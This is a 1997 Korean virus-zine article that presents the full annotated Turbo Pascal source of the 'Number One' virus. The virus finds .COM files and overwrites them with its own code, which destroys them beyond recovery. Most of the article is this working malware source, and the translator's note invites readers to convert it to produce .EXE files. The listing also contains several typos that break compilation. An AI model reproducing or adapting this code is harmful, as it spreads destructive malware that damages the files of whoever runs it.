
 Pascal 바이러스                                                CVC #02  97/09

---------------------------------------------------------------------> NirWana

                           파스칼로 쓴 Virus
                           -----------------

파스칼은 놀라울 정도의 컴퓨터 바이러스를 만들수있는 또다른 고급언어이다.
특히 터보 파스칼은 뛰어나다.  아래에 있는 바이러스는 한동안 여러 bbs에
서 찾아볼수 있었다.

{
------------------------------------------------------------------
Number One

이 바이러스를 조심해서 다루기 바란다. [치명적 데모]

Number One은 모든 .COM 화일을 감염시킨다. - 화일명이 화면에 나올것이다.
Number One의 코드가 덮여씌워지면 그 화일은 복구가 불가능하다.  만일 모
든 .COM화일이 감염되거나 더이상 .COM화일이 없으면 Number One은 화면에
<Smile>을 출력한다.  화일들에 읽기 전용 속성을 설정하여 Number One의 감
염을 막을수 있다.

Written 10.3.87 by M.Vallen (Turbo Pascal 3.01A)

( 역자주 : Turbo Pascal 3.0 이하에서만이 .COM화일로 컴파일이 된다.
           TP 4.0 이후로는 .EXE화일로 컴파일되도록 바뀌었다.
           이 프로그램은 .COM화일을 만들도록 짜여졌다.
           그런데... 누가 Turbo Pascal 3.0을 아직 갖고 있겠는가?
           통신에서는 Zilog사의 Z80용의 TP 3.0만이 있으며, Z80은 전공
           이 컴퓨터와 직접관계가 없는 사람에게 있어서 무의미할뿐이다.
           더우기 이처럼 도스서비스를 사용하는 프로그램은 Z80 TP 3.0
           상에서 제대로 컴파일 되지 않는다.
           누가 자신의 어린시절 디스켓 박스에서 찾아낸 곰팡내나는 도스
           용 TP 3.0을 보내주지 않는 이상 우리가 이 소스를 평가해보는
           유일한 수단은 우리의 논리적인 머리뿐이다.
           파스칼에 익숙하다면 소스의 많은 부분을 고쳐서 .EXE화일로
           변경할수있을것이다. )

------------------------------------------------------ }


{C-}
{U-}
{I-}

{ -- 상수 선언 --------------------------------------- }

Const
     VirusSize = 12027;    { Number One의 코드 사이즈 }

     Warning   :String[42]    { 경고 메시지 }
     = 'This file has been infected ny Number One!';

{ -- 사용자 정의형 선언 ------------------------------ }

Type
     DTARec    =Record      { 화일검색에 사용할 DTA레코드 }
     DOSnext  :Array[1..21] of Byte;
                   Attr    : Byte;
                   Ftime,
                   FDate,
                   FLsize,
                   FHsize  : Integer;
                   FullName: Array[1..13] of Char;
                 End;

Registers    = Record    { 레지스터를 사용 }
   Case Byte of
   1 : (AX,BX,CX,DX,BP,SI,DI,DS,ES,Flags : Integer);
   2 : (AL,AH,BL,BH,CL,CH,DL,DH          : Byte);
   End;

{ -- 변수 선언 ---------------------------------------- }

Var
                                     { 프로그램의 시작 위치 }
   ProgramStart : Byte absolute Cseg:$100;
                                     { 감염된 지문 }
   MarkInfected : String[42] absolute Cseg:$180;
   Reg          : Registers;         { 레지스터형 }
   DTA          : DTARec;                       { DTA }

   Buffer       : Array[Byte] of Byte;          { 버퍼 }
   TestID       : String[42];        { 감염된 화일의 식별을 위해 }
   UsePath      : String[66];        { 화일 검색에 쓰일 경로 }
                                     { 검색 경로의 길이 }
   UsePathLenght: Byte absolute UsePath;
   Go           : File;              { 감염시킬 화일 }
   B            : Byte;

{ -- 실행부 ------------------------------------------ }

Begin
  WriteLn(Warning);                  { 경고 메시지를 출력 }
  GetDir(0, UsePath);                { 현재 경로를 얻는다. }
  if Pos('\', UsePath) <> UsePathLenght then
    UsePath := UsePath + '\';
  UsePath := UsePath + '*.COM';      { 모든 COM화일을 찾는다. }
  Reg.AH := $1A;                     { DTA영역 설정 }
  Reg.DS := Seg(DTA);
  Reg.DX := Ofs(DTA);
  MsDos(Reg);
  UsePath[Succ(UsePathLenght)]:=#0;  { 경로명은 Asciiz로 끝나야 한다. }
  Reg.AH := $4E;
  Reg.DS := Seg(UsePath);
  Reg.DX := Ofs(UsePath[1]);
  Reg CX := $ff;                     { 모든 속성의 화일에 대해 검색 }
  MsDos(Reg);                        { 일치하는 첫번째 화일을 찾는다. }
  IF not Odd(Reg.Flags) Then         { 화일이 발견되면 }
    Repeat
      UsePath := DTA.FullName;
      B := Pos(#0, UsePath);
      If B > 0 then
      Delete(UsePath, B, 255);       { 경로명뒤의 쓸모없는 부위제거 }
      Assign(Go, UsePath);
      Reset(Go);                     { 화일 오픈 }
      If IOresult = 0 Then           { 에러가 일어나지 않으면 }
      Begin
        BlockRead(Go, Buffer, 2);
        Move(Buffer[$80], TestID, 43);

        If TestID <> Warning Then    { 이미 감염되었는지 검사한다. }
        Begin                        { 감염되어있지 않으면 }
          Seek (Go, 0);
                                     { 감염되었다고 표시하고나서... }
          MarkInfected := Warning;
                                     { 화일을 감염시킨다. }
          BlockWrite(Go,ProgramStart,Succ(VirusSize shr 7);
          Close(Go);              { 화일 닫기 }
                                  { 감염되었다고 화면에 표시 }
          WriteLn(UsePath + 'infected.');
          Halt;                   { 프로그램종료 }
        End;
        Close(Go);                { 화일 닫기 }
      End;
        { 이미 감염되어있으면 다음 화일을 찾는다. }
      Reg.AH := $4F;
      Reg.DS := Seg(DTA);
      Reg.DX := Ofs(DTA);
      MsDos(Reg);
    {  모든 .COM화일을 모두 조사할때까지 찾는다. }
    Until Odd(Red.Flags);
  Write(`<Smile>');                          { <Smile>을 출력 }
End.

이것은 .COM화일만을 감염시키는 원시적인 바이러스이다.

사이즈는 12K이며, 감염시 화일의 날짜를 변경한다.

